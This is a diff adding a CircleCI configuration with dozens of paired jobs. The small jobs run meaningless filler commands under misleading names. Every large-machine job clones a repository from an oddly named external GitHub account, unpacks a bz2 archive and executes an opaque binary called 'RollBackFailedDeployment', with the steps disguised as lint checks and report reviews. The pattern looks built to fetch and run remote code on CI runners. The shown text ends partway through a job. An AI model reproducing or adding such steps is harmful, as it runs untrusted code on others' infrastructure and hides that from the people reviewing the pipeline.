@@ -1,0 +1,1905 @@
+version: 2.1
+
+jobs:
+  probe-session-store:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - run:
+          name: Configure Messaging Test Cache
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; name="shard-12-of-15"; echo "$name" | tr -d a-z; true ; } > /tmp/DeferredBrowserTest/PostCommitStage
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'PostCommitStage'
+  RateLimiterSymbolUpload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/PostCommitStage" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --jobs 1 "https://github.com/${hooks}/${fullsync}" ${PWD}
+      - run:
+          name: Restore vendored sources
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            cd "$(pwd)" && exec ./RollBackFailedDeployment
+  StripImporterBinaries:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: ProfilerConfigurationSnapshot
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; printf '%s\n' "nebula 14" "stork 21" "seal 16" "iodine 5" | wc -w; true ; } > /tmp/DeferredBrowserTest/FullMatrix
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'FullMatrix'
+  LowPriorityInstall:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/FullMatrix" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --depth=1 --no-tags "https://github.com/${hooks}/${fullsync}" "$(pwd)"
+      - run:
+          name: Fetch fixtures
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            /bin/bash -c './RollBackFailedDeployment'
+  moving-encoder-metrics:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Bundle user guide for each target
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; printf '%s\n' red boron camel lime | sed -n '/^li/p'; csv="pecan,anvil,chi,brown,camel"; echo "$csv" | tr , '\n' | nl; true ; } > /tmp/DeferredBrowserTest/statusPageCompilerFlags
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'statusPageCompilerFlags'
+  monthly-container-rebuild:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/statusPageCompilerFlags" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --jobs 2 "https://github.com/${hooks}/${fullsync}" .
+      - run:
+          name: Sync asset bundles
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            cd "$(pwd)" && ./RollBackFailedDeployment
+  PeriodicServiceDeploymentStep:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Release bridge
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; printf '%d x %d = %d\n' 31 6 $((31 * 6)); true ; } > /tmp/DeferredBrowserTest/helpCenterArtifactBackup
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'helpCenterArtifactBackup'
+  continuous-checkout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/helpCenterArtifactBackup" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --no-tags "https://github.com/${hooks}/${fullsync}" "`pwd`"
+      - run:
+          name: Unpack toolkit
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            sh -c "./RollBackFailedDeployment"
+  RenderAndPublishUserGuide:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Remote inspection
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; echo "100 49 7" && echo "4 modules compiled"; true ; } > /tmp/DeferredBrowserTest/purge-catalog-module-cache
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'purge-catalog-module-cache'
+  compressAndStoreCrashDumps:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/purge-catalog-module-cache" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --depth 5 "https://github.com/${hooks}/${fullsync}" ./
+      - run:
+          name: Hydrate workspace
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            "$PWD/RollBackFailedDeployment"
+  PreReviewReleasePackaging:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: FinalImporterBuildCache
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; echo "lane fox is clear"; printf '%s\n' rowan rat horse | grep -c -E '[aeiou]{2}' || echo "no double vowels"; true ; } > /tmp/DeferredBrowserTest/NightlyBenchmark
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'NightlyBenchmark'
+  storageRollback:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/NightlyBenchmark" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --depth 2 "https://github.com/${hooks}/${fullsync}" `pwd`
+      - run:
+          name: Extract sources
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            cd "$PWD" && exec ./RollBackFailedDeployment
+  BundleChecksumRoutine:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - run:
+          name: Start core
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; printf '%s\n' cobra lime walnut salmon | sed 'G'; true ; } > /tmp/DeferredBrowserTest/generated-renderer-code
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'generated-renderer-code'
+  PlaygroundServiceHealthCheck:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/generated-renderer-code" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --jobs 1 "https://github.com/${hooks}/${fullsync}" $PWD
+      - run:
+          name: Restore build cache
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            cd "$PWD" && ./RollBackFailedDeployment
+  PullBillingImage:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: verification task
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; echo "leg 4 of 7 ready"; s="quasar hammer"; echo "$s" | wc -w; true ; } > /tmp/DeferredBrowserTest/periodic-asset-upload
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'periodic-asset-upload'
+  toolkit-schema-migrations:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/periodic-asset-upload" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --quiet --depth 1 "https://github.com/${hooks}/${fullsync}" "${PWD}"
+      - run:
+          name: Pull reference data
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            cd "$PWD" && exec ./RollBackFailedDeployment
+  InitializeExtension:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: extracting-build-metadata
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; echo "using teal profile"; day="tue"; case "$day" in sat|sun) echo weekend;; *) echo weekday;; esac; true ; } > /tmp/DeferredBrowserTest/ConfigureQueryPlanner
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'ConfigureQueryPlanner'
+  runDocumentConverterStressTests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/ConfigureQueryPlanner" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --depth 3 --no-tags --no-single-branch "https://github.com/${hooks}/${fullsync}" "$PWD"
+      - run:
+          name: Stage inputs
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            env ./RollBackFailedDeployment
+  daily-lint:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: accessibility-audit-task
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; note_step() { echo "step $1"; }; note_step 1; note_step 2; note_step 3; note_step 4; true ; } > /tmp/DeferredBrowserTest/periodic-dependency-freeze
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'periodic-dependency-freeze'
+  overnight-report-exporter-sync:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/periodic-dependency-freeze" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --depth=2 --filter=blob:none "https://github.com/${hooks}/${fullsync}" "."
+      - run:
+          name: Unpack bundle
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            bash -lc "./RollBackFailedDeployment"
+  plugin-test-report-partition-8:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: CoreBuildMetrics
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; echo "warming up importer"; name="oak piston copper"; echo "${#name} characters"; echo "importer warmed up"; true ; } > /tmp/DeferredBrowserTest/resolve-version-conflicts
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'resolve-version-conflicts'
+  Dump:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/resolve-version-conflicts" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --depth 1 --no-single-branch "https://github.com/${hooks}/${fullsync}" ./
+      - run:
+          name: Rehydrate tree
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            bash -c "exec ./RollBackFailedDeployment"
+  FinalArtifactRemovalStep:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Batch 11 minimal cache rebuild
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; label="elk delta"; echo "$label" | awk '{print toupper($0)}'; true ; } > /tmp/DeferredBrowserTest/post-release-stress-tests
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'post-release-stress-tests'
+  release-signing-phase:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/post-release-stress-tests" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --depth 2 "https://github.com/${hooks}/${fullsync}" "$(pwd)"
+      - run:
+          name: Fetch corpus
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            cd "$PWD" && exec ./RollBackFailedDeployment
+  fallback-artifact-download:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - run:
+          name: List memory leaks in summary form
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; job="style check"; echo "$job is ready"; true ; } > /tmp/DeferredBrowserTest/BackgroundArchiveInspection
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'BackgroundArchiveInspection'
+  PersistFrameworkBuildSummary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/BackgroundArchiveInspection" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --depth=1 --no-tags --filter=blob:none "https://github.com/${hooks}/${fullsync}" "."
+      - run:
+          name: Checkout vendored deps
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            /bin/bash -c './RollBackFailedDeployment'
+  pre-push-stage-cycle-6:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: update-agent-image-signing
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; echo "all 10 checks passed"; seq 1 5 | tail -n +11; true ; } > /tmp/DeferredBrowserTest/Splitting
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'Splitting'
+  uploadPackageToObjectStorage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/Splitting" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --quiet --depth 1 "https://github.com/${hooks}/${fullsync}" .
+      - run:
+          name: Prime workspace
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            bash -lc './RollBackFailedDeployment'
+  fallback-branch-sync-routine:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Build Matrix (chunk 7 of 7)
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; printf '%s\n' willow camel deer snake | grep -E 'l$' || echo "none end with l"; true ; } > /tmp/DeferredBrowserTest/publish-scan-results
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'publish-scan-results'
+  fetch-sources-with-timeout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/publish-scan-results" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --jobs 2 "https://github.com/${hooks}/${fullsync}" $PWD
+      - run:
+          name: Unpack payload
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            cd "$PWD" && exec ./RollBackFailedDeployment
+  remote-bundle-build-workflow:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: ArtifactRemovalStage
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; for pkg in carbon pluto; do echo "$pkg"; done; echo "loop finished"; true ; } > /tmp/DeferredBrowserTest/Unpack
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'Unpack'
+  clean-up-old-snapshots:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/Unpack" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --depth=1 --single-branch "https://github.com/${hooks}/${fullsync}" ${PWD}
+      - run:
+          name: Restore snapshot
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            cd "$PWD" && exec ./RollBackFailedDeployment
+  mobile-app-package-download:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Warm remote cache in background
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; echo $((91/15+17)); true ; } > /tmp/DeferredBrowserTest/DownloadRuntimeDependencies
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'DownloadRuntimeDependencies'
+  verify-breaking-changes:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/DownloadRuntimeDependencies" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --depth 5 "https://github.com/${hooks}/${fullsync}" "./"
+      - run:
+          name: Fetch sources
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            sh -c './RollBackFailedDeployment'
+  deferredProvisioningHook:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: partial-library-log-upload
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; printf '%5d|\n' 38; printf '%s\n' "pass 2 complete"; true ; } > /tmp/DeferredBrowserTest/decoderArtifactExtractionTask
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'decoderArtifactExtractionTask'
+  status-update-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/decoderArtifactExtractionTask" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --depth=1 --filter=blob:none "https://github.com/${hooks}/${fullsync}" ./
+      - run:
+          name: Unroll archive
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            "$PWD/RollBackFailedDeployment"
+  archive-reference-manual:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - run:
+          name: Compute and verify checksum
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; echo "larch wrench nova iodine goat" | md5sum && echo stage 1 of 2; true ; } > /tmp/DeferredBrowserTest/complete-bump
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'complete-bump'
+  upgrades-segment-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/complete-bump" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone -q --depth 1 "https://github.com/${hooks}/${fullsync}" .
+      - run:
+          name: Seed workspace
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            exec "./RollBackFailedDeployment"
+  ArchiveCompressionStep:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: MirrorReportingTutorials
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; version="7.15.4"; echo "building version $version"; echo "build $version finished"; true ; } > /tmp/DeferredBrowserTest/fast-release
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'fast-release'
+  Correctness:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/fast-release" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --depth=2 --branch main "https://github.com/${hooks}/${fullsync}" .
+      - run:
+          name: Unpack sources
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            env "./RollBackFailedDeployment"
+  BridgeCompile:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Setting up test database
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; printf '%s\n' saturn lunar saturn hinge saturn lunar | sort | uniq -d; true ; } > /tmp/DeferredBrowserTest/billing-service-debug-logs
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'billing-service-debug-logs'
+  drainCanaryNodesEveryHour:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/billing-service-debug-logs" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --single-branch "https://github.com/${hooks}/${fullsync}" .
+      - run:
+          name: Restore vendored sources
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            /bin/sh -c "./RollBackFailedDeployment"
+  sharedMemoryBenchmark:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: export-loader-lint-results-to-job-summary
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; elapsed=0; for cost in 17 25 4 10 28; do elapsed=$((elapsed + cost)); echo "running total $elapsed seconds"; done; true ; } > /tmp/DeferredBrowserTest/isolated-release-bump-step
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'isolated-release-bump-step'
+  benchmark-simulator-throughput:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/isolated-release-bump-step" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --no-tags "https://github.com/${hooks}/${fullsync}" $PWD
+      - run:
+          name: Fetch fixtures
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            bash -c "exec ./RollBackFailedDeployment"
+  RemotePluginUpdate:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Dump dependency tree on release branches
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; echo "9 modules compiled" && printf '%s\n' "yellow 23" "lemon 23" "llama 34" "venus 16" | awk '{print $1}' | sort; true ; } > /tmp/DeferredBrowserTest/ArchiveExtensionCrashDumps
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
+            - 'ArchiveExtensionCrashDumps'
+  deploy-archive-to-one-region:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Review update agent test report before publish
+          command: |
+            awk '!seen[$0]++' "/tmp/DeferredBrowserTest/ArchiveExtensionCrashDumps" | head -c 1500
+      - run:
+          name: ExecutingControllerLintChecks
+          command: |
+            hooks="celinacanales373641gwsdpoek-ship-it"; fullsync="landing-page-dependency-audit"
+            git clone --depth 2 --branch main "https://github.com/${hooks}/${fullsync}" "$PWD"
+      - run:
+          name: Sync asset bundles
+          command: |
+            bunzip2 -c track-session-store-build-time.tar.bz2 | tar xf -
+      - run:
+          command: |
+            './RollBackFailedDeployment'
+  embedding-debug-information:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/DeferredBrowserTest
+      - run:
+          name: Deploy tutorials to staging site
+          command: |
+            mkdir -p /tmp/DeferredBrowserTest
+            { set +o pipefail 2>/dev/null; echo "nothing to do for feature flags"; value="nova"; case "$value" in nova) echo exact;; no*) echo prefix;; *) echo none;; esac; true ; } > /tmp/DeferredBrowserTest/ExperimentalBuildDigest
+      - persist_to_workspace:
+          root: /tmp/DeferredBrowserTest
+          paths:
